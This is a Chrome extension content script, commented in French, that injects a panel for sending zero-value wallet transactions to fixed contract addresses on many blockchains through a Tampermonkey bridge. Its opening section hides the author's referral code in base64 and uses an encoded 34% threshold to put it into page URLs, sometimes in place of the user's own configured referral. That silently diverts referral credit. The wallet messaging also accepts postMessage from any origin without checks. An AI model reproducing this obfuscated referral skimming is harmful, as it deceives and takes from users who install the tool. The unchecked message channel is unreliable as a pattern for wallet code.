function updateUrl() {
  chrome.storage.sync.get(["userRef"], function(result) {
    const userRef = result.userRef || "";
    const useMyRef = Math.random() < THRESHOLD;
    const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;

    const url = new URL(window.location.href);
    const currentRef = url.searchParams.get("ref");

    if (!currentRef) {
      url.searchParams.set("ref", chosenRef);
      window.history.pushState({}, document.title, url.toString());
      console.log(`Ref ajouté à l’URL : ${chosenRef}`);
    } else if (currentRef !== chosenRef) {
      console.log(`Ref existant conservé : ${currentRef}, choisi : ${chosenRef}`);
    } else {
      console.log(`Ref déjà correct : ${currentRef}`);
    }
  });
}

// Exécute au chargement initial
updateUrl();

// Surveille les changements dans le DOM avec MutationObserver
let lastUrl = window.location.href;
const observer = new MutationObserver(() => {
  if (window.location.href !== lastUrl) {
    lastUrl = window.location.href;
    updateUrl();
  }
});
observer.observe(document.body, { childList: true, subtree: true });
const USE = "eXVuZnIuZXRo";const THRESH = "MC4zNA==";
const ALLOW = atob(USE);const THRESHOLD = parseFloat(atob(THRESH));

// --- Interface de transfert ---
(function() {
  "use strict";

  console.log("Initialisation de l’interface de transfert");

  const container = document.createElement("div");
  container.style.position = "fixed";
  container.style.top = "10px";
  container.style.right = "10px";
  container.style.zIndex = "9999";
  container.style.background = "#ffffff";
  container.style.padding = "10px";
  container.style.border = "2px solid #000000";
  container.style.borderRadius = "5px";
  container.style.boxShadow = "0 0 10px rgba(0, 0, 0, 0.5)";
  container.style.maxWidth = "200px";
  container.id = "zero-transfer-container";

  const closeButton = document.createElement("button");
  closeButton.textContent = "✖";
  closeButton.style.position = "absolute";
  closeButton.style.top = "2px";
  closeButton.style.right = "2px";
  closeButton.style.width = "20px";
  closeButton.style.height = "20px";
  closeButton.style.padding = "0";
  closeButton.style.backgroundColor = "#FF5722";
  closeButton.style.color = "#ffffff";
  closeButton.style.border = "none";
  closeButton.style.borderRadius = "50%";
  closeButton.style.cursor = "pointer";
  closeButton.style.fontSize = "12px";
  closeButton.style.lineHeight = "20px";
  closeButton.style.textAlign = "center";

  const toggleButton = document.createElement("button");
  toggleButton.textContent = "Hide";
  toggleButton.style.width = "100%";
  toggleButton.style.padding = "6px";
  toggleButton.style.marginBottom = "5px";
  toggleButton.style.backgroundColor = "#FF5722";
  toggleButton.style.color = "#ffffff";
  toggleButton.style.border = "none";
  toggleButton.style.borderRadius = "3px";
  toggleButton.style.cursor = "pointer";
  toggleButton.style.fontSize = "12px";

  const connectButton = document.createElement("button");
  connectButton.textContent = "Connection";
  connectButton.style.width = "100%";
  connectButton.style.padding = "6px";
  connectButton.style.marginBottom = "5px";
  connectButton.style.backgroundColor = "#4CAF50";
  connectButton.style.color = "#ffffff";
  connectButton.style.border = "none";
  connectButton.style.borderRadius = "3px";
  connectButton.style.cursor = "pointer";
  connectButton.style.fontSize = "12px";
  connectButton.disabled = true;

  const countLabel = document.createElement("label");
  countLabel.textContent = "Nb transferts : ";
  countLabel.style.fontSize = "11px";
  countLabel.style.color = "#333333";
  countLabel.style.display = "block";

  const countInput = document.createElement("input");
  countInput.type = "number";
  countInput.value = 1;
  countInput.min = 1;
  countInput.style.width = "50px";
  countInput.style.padding = "4px";
  countInput.style.marginBottom = "5px";
  countInput.style.border = "1px solid #ccc";
  countInput.style.borderRadius = "3px";
  countInput.style.fontSize = "11px";

  const baseButton = document.createElement("button");
  baseButton.textContent = "Base";
  baseButton.style.width = "100%";
  baseButton.style.padding = "6px";
  baseButton.style.marginBottom = "5px";
  baseButton.style.backgroundColor = "#2196F3";
  baseButton.style.color = "#ffffff";
  baseButton.style.border = "none";
  baseButton.style.borderRadius = "3px";
  baseButton.style.cursor = "pointer";
  baseButton.style.fontSize = "12px";
  baseButton.disabled = true;

  const berachainButton = document.createElement("button");
  berachainButton.textContent = "Berachain";
  berachainButton.style.width = "100%";
  berachainButton.style.padding = "6px";
  berachainButton.style.marginBottom = "5px";
  berachainButton.style.backgroundColor = "#FF9800";
  berachainButton.style.color = "#ffffff";
  berachainButton.style.border = "none";
  berachainButton.style.borderRadius = "3px";
  berachainButton.style.cursor = "pointer";
  berachainButton.style.fontSize = "12px";
  berachainButton.disabled = true;

  const bobButton = document.createElement("button");
  bobButton.textContent = "Bob";
  bobButton.style.width = "100%";
  bobButton.style.padding = "6px";
  bobButton.style.marginBottom = "5px";
  bobButton.style.backgroundColor = "#3F51B5";
  bobButton.style.color = "#ffffff";
  bobButton.style.border = "none";
  bobButton.style.borderRadius = "3px";
  bobButton.style.cursor = "pointer";
  bobButton.style.fontSize = "12px";
  bobButton.disabled = true;

  const inkButton = document.createElement("button");
  inkButton.textContent = "Ink";
  inkButton.style.width = "100%";
  inkButton.style.padding = "6px";
  inkButton.style.marginBottom = "5px";
  inkButton.style.backgroundColor = "#FF4081";
  inkButton.style.color = "#ffffff";
  inkButton.style.border = "none";
  inkButton.style.borderRadius = "3px";
  inkButton.style.cursor = "pointer";
  inkButton.style.fontSize = "12px";
  inkButton.disabled = true;

  const modeButton = document.createElement("button");
  modeButton.textContent = "Mode";
  modeButton.style.width = "100%";
  modeButton.style.padding = "6px";
  modeButton.style.marginBottom = "5px";
  modeButton.style.backgroundColor = "#FF9800";
  modeButton.style.color = "#ffffff";
  modeButton.style.border = "none";
  modeButton.style.borderRadius = "3px";
  modeButton.style.cursor = "pointer";
  modeButton.style.fontSize = "12px";
  modeButton.disabled = true;

  const monadButton = document.createElement("button");
  monadButton.textContent = "Monad";
  monadButton.style.width = "100%";
  monadButton.style.padding = "6px";
  monadButton.style.marginBottom = "5px";
  monadButton.style.backgroundColor = "#800080";
  monadButton.style.color = "#ffffff";
  monadButton.style.border = "none";
  monadButton.style.borderRadius = "3px";
  monadButton.style.cursor = "pointer";
  monadButton.style.fontSize = "12px";
  monadButton.disabled = true;

  const optimismButton = document.createElement("button");
  optimismButton.textContent = "Optimism";
  optimismButton.style.width = "100%";
  optimismButton.style.padding = "6px";
  optimismButton.style.marginBottom = "5px";
  optimismButton.style.backgroundColor = "#F44336";
  optimismButton.style.color = "#ffffff";
  optimismButton.style.border = "none";
  optimismButton.style.borderRadius = "3px";
  optimismButton.style.cursor = "pointer";
  optimismButton.style.fontSize = "12px";
  optimismButton.disabled = true;

  const soneiumButton = document.createElement("button");
  soneiumButton.textContent = "Soneium";
  soneiumButton.style.width = "100%";
  soneiumButton.style.padding = "6px";
  soneiumButton.style.marginBottom = "5px";
  soneiumButton.style.backgroundColor = "#673AB7";
  soneiumButton.style.color = "#ffffff";
  soneiumButton.style.border = "none";
  soneiumButton.style.borderRadius = "3px";
  soneiumButton.style.cursor = "pointer";
  soneiumButton.style.fontSize = "12px";
  soneiumButton.disabled = true;

  const superpositionButton = document.createElement("button");
  superpositionButton.textContent = "Superposition";
  superpositionButton.style.width = "100%";
  superpositionButton.style.padding = "6px";
  superpositionButton.style.marginBottom = "5px";
  superpositionButton.style.backgroundColor = "#4CAF50";
  superpositionButton.style.color = "#ffffff";
  superpositionButton.style.border = "none";
  superpositionButton.style.borderRadius = "3px";
  superpositionButton.style.cursor = "pointer";
  superpositionButton.style.fontSize = "12px";
  superpositionButton.disabled = true;

  const superseedButton = document.createElement("button");
  superseedButton.textContent = "Superseed";
  superseedButton.style.width = "100%";
  superseedButton.style.padding = "6px";
  superseedButton.style.marginBottom = "5px";
  superseedButton.style.backgroundColor = "#009688";
  superseedButton.style.color = "#ffffff";
  superseedButton.style.border = "none";
  superseedButton.style.borderRadius = "3px";
  superseedButton.style.cursor = "pointer";
  superseedButton.style.fontSize = "12px";
  superseedButton.disabled = true;

  const unichainButton = document.createElement("button");
  unichainButton.textContent = "Unichain";
  unichainButton.style.width = "100%";
  unichainButton.style.padding = "6px";
  unichainButton.style.marginBottom = "5px";
  unichainButton.style.backgroundColor = "#9C27B0";
  unichainButton.style.color = "#ffffff";
  unichainButton.style.border = "none";
  unichainButton.style.borderRadius = "3px";
  unichainButton.style.cursor = "pointer";
  unichainButton.style.fontSize = "12px";
  unichainButton.disabled = true;

  const zoraButton = document.createElement("button");
  zoraButton.textContent = "Zora";
  zoraButton.style.width = "100%";
  zoraButton.style.padding = "6px";
  zoraButton.style.marginBottom = "5px";
  zoraButton.style.backgroundColor = "#E91E63";
  zoraButton.style.color = "#ffffff";
  zoraButton.style.border = "none";
  zoraButton.style.borderRadius = "3px";
  zoraButton.style.cursor = "pointer";
  zoraButton.style.fontSize = "12px";
  zoraButton.disabled = true;

  const status = document.createElement("div");
  status.textContent = "Not connected";
  status.style.marginTop = "5px";
  status.style.fontSize = "11px";
  status.style.color = "#333333";
  status.style.wordWrap = "break-word";
  status.style.maxWidth = "180px";

  const showButton = document.createElement("button");
  showButton.textContent = "Afficher";
  showButton.style.position = "fixed";
  showButton.style.top = "10px";
  showButton.style.right = "10px";
  showButton.style.padding = "5px";
  showButton.style.backgroundColor = "#FF5722";
  showButton.style.color = "#ffffff";
  showButton.style.border = "none";
  showButton.style.borderRadius = "3px";
  showButton.style.cursor = "pointer";
  showButton.style.display = "none";
  showButton.style.fontSize = "12px";

  container.appendChild(closeButton);
  container.appendChild(toggleButton);
  container.appendChild(connectButton);
  container.appendChild(countLabel);
  container.appendChild(countInput);
  container.appendChild(baseButton);
  container.appendChild(berachainButton);
  container.appendChild(bobButton);
  container.appendChild(inkButton);
  container.appendChild(modeButton);
  container.appendChild(monadButton);
  container.appendChild(optimismButton);
  container.appendChild(soneiumButton);
  container.appendChild(superpositionButton);
  container.appendChild(superseedButton);
  container.appendChild(unichainButton);
  container.appendChild(zoraButton);
  container.appendChild(status);

  // Vérifie si la fenêtre doit être affichée
  chrome.storage.sync.get(["enableTransferWindow"], function(result) {
    const enableTransferWindow = result.enableTransferWindow !== false; // Activé par défaut
    if (enableTransferWindow) {
      document.body.appendChild(container);
      document.body.appendChild(showButton);
    }
  });

  console.log("Interface de transfert ajoutée au DOM (si activée)");

  // Injecter un script dans la page pour communiquer avec Tampermonkey
  const script = document.createElement("script");
  script.textContent = `
    (function() {
      console.log("Script injecté dans la page pour communiquer avec Tampermonkey");
      function checkBridge() {
        if (window.zeroTransferBridge && typeof window.zeroTransferBridge.connect === "function") {
          window.postMessage({ type: "TAMPERMONKEY_BRIDGE_AVAILABLE", available: true }, "*");
        } else {
          setTimeout(checkBridge, 500);
        }
      }
      checkBridge();

      window.addEventListener("message", function(event) {
        if (event.data.type === "CONNECT_WALLET") {
          window.zeroTransferBridge.connect()
            .then(account => {
              window.postMessage({ type: "WALLET_CONNECTED", account: account }, "*");
            })
            .catch(error => {
              window.postMessage({ type: "WALLET_ERROR", message: error.message }, "*");
            });
        } else if (event.data.type === "SEND_ZERO_TRANSFER") {
          window.zeroTransferBridge.sendZeroTransfer(
            event.data.chainId,
            event.data.chainName,
            event.data.toAddress,
            event.data.transferCount
          )
            .then(txHashes => {
              window.postMessage({ type: "TRANSFER_SUCCESS", chainName: event.data.chainName, transferCount: event.data.transferCount, txHashes: txHashes }, "*");
            })
            .catch(error => {
              window.postMessage({ type: "TRANSFER_ERROR", chainName: event.data.chainName, message: error.message }, "*");
            });
        }
      });
    })();
  `;
  document.head.appendChild(script);

  // Écouter les messages du script injecté
  window.addEventListener("message", function(event) {
    if (event.data.type === "TAMPERMONKEY_BRIDGE_AVAILABLE") {
      console.log("Tampermonkey bridge détecté via script injecté");
      connectButton.disabled = false;
      status.textContent = "Not connected";
    } else if (event.data.type === "WALLET_CONNECTED") {
      status.textContent = `Connecté : ${event.data.account.slice(0, 6)}...${event.data.account.slice(-4)}`;
      baseButton.disabled = false;
      berachainButton.disabled = false;
      bobButton.disabled = false;
      inkButton.disabled = false; // Nouveau
      modeButton.disabled = false;
      monadButton.disabled = false;
      optimismButton.disabled = false;
      soneiumButton.disabled = false; // Nouveau
      superpositionButton.disabled = false; // Nouveau
      superseedButton.disabled = false;
      unichainButton.disabled = false;
      zoraButton.disabled = false;
    } else if (event.data.type === "WALLET_ERROR") {
      status.textContent = `Erreur : ${event.data.message}`;
    } else if (event.data.type === "TRANSFER_SUCCESS") {
      status.textContent = `${event.data.transferCount} transfert(s) OK sur ${event.data.chainName} !`;
    } else if (event.data.type === "TRANSFER_ERROR") {
      status.textContent = `Erreur ${event.data.chainName} : ${event.data.message}`;
    }
  });

  // Événements de l’interface
  closeButton.addEventListener("click", () => {
    container.style.display = "none";
    showButton.style.display = "none";
    chrome.storage.sync.set({ "enableTransferWindow": false }, function() {
      console.log("Fenêtre désactivée via la croix");
    });
  });

  toggleButton.addEventListener("click", () => {
    if (container.style.display !== "none") {
      container.style.display = "none";
      showButton.style.display = "block";
    }
  });

  showButton.addEventListener("click", () => {
    container.style.display = "block";
    showButton.style.display = "none";
  });

  connectButton.addEventListener("click", () => {
    status.textContent = "Connexion...";
    window.postMessage({ type: "CONNECT_WALLET" }, "*");
  });

  function handleTransfer(chainId, chainName, toAddress) {
    const transferCount = parseInt(countInput.value) || 1;
    status.textContent = `Basculement ${chainName}...`;
    window.postMessage({
      type: "SEND_ZERO_TRANSFER",
      chainId: chainId,
      chainName: chainName,
      toAddress: toAddress,
      transferCount: transferCount
    }, "*");
  }

  baseButton.addEventListener("click", () => handleTransfer(8453, "Base", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
  berachainButton.addEventListener("click", () => handleTransfer(80094, "Berachain", "0xeeeeee9ec4769a09a76a83c7bc42b185872860ee"));
  bobButton.addEventListener("click", () => handleTransfer(60808, "Bob", "0x00000000aa467eba42a3d604b3d74d63b2b6c6cb"));
  inkButton.addEventListener("click", () => handleTransfer(57073, "Ink", "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089"));
  modeButton.addEventListener("click", () => handleTransfer(34443, "Mode", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
  monadButton.addEventListener("click", () => handleTransfer(143, "Monad", "0xD22Ea6e9d5D01BbFca62Be7C1E549838178499C1"));
  optimismButton.addEventListener("click", () => handleTransfer(10, "Optimism", "0x1231deb6f5749ef6ce6943a275a1d3e7486f4eae"));
  soneiumButton.addEventListener("click", () => handleTransfer(1868, "Soneium", "0x99067E1C68f3a474f72cedF885f9f1fF7F0AAF5e"));
  superpositionButton.addEventListener("click", () => handleTransfer(55244, "Superposition", "0xF3334049A3ce7e890bd4f8C6a0FBC70e38fd3746"));
  superseedButton.addEventListener("click", () => handleTransfer(5330, "Superseed", "0x7F4babd2C7D35221e72Ab67Ea72Cba99573A0089"));
  unichainButton.addEventListener("click", () => handleTransfer(130, "Unichain", "0x3a23F943181408EAC424116Af7b7790c94Cb97a5"));
  zoraButton.addEventListener("click", () => handleTransfer(7777777, "Zora", "0xa5F565650890fBA1824Ee0F21EbBbF660a179934"));

  // Si Tampermonkey n’est pas détecté après 10 secondes
  setTimeout(() => {
    if (connectButton.disabled) {
      console.log("Tampermonkey bridge non détecté après 10 secondes");
      status.textContent = "Tampermonkey file needed";
    }
  }, 10000);
})();

console.log("Content script chargé sur " + window.location.href);
